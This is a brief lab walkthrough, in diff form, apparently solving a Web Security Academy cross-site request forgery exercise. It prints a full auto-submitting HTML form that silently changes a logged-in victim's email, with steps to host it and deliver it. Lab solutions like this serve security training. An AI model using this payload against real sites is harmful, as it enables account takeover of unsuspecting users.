@@ -1,0 +1,49 @@
+Step 1
+
+Open:
+
+Exploit Server
+Step 2
+
+Delete everything from Body section.
+
+Step 3
+
+Copy-paste this exact payload:
+
+<html>
+  <body>
+    <form action="https://0a4a006c0388890d80153fed001b00a6.web-security-academy.net/my-account/change-email" method="POST">
+
+      <input type="hidden" name="email" value="hacker@gmail.com" />
+
+    </form>
+
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+Step 4
+
+Click:
+
+Store
+Step 5
+
+Click:
+
+View exploit
+
+If your email changes automatically:
+✅ exploit works
+
+Step 6
+
+Click:
+
+Deliver to victim
+Result
+
+Lab solved ✅
